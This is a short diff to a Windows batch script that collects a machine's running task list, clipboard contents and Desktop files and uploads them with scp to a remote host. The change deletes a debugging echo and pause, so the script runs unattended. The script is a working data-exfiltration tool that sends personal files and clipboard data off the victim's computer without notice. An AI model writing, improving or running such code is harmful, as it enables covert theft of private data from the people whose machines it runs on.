@@ -46,8 +46,6 @@ if exist "%cd%\files\" (
 tasklist > tasks.txt
 powershell get-clipboard > clipboard.txt
 cd %startDir%
-echo %cd%
-pause
 scp -r "%COMPUTERNAME%" %user%@%host%:/home/%user%/
 cd "%COMPUTERNAME%\%USERNAME%\%MYDATE%\"
 if exist "%USERPROFILE%\Desktop" ( %copy% "%USERPROFILE%\Desktop" "%cd%\files\Desktop" ) else if exist "%USERPROFILE%\OneDrive\Desktop" ( %copy% "%USERPROFILE%\OneDrive\Desktop" "%cd%\files\Desktop" )
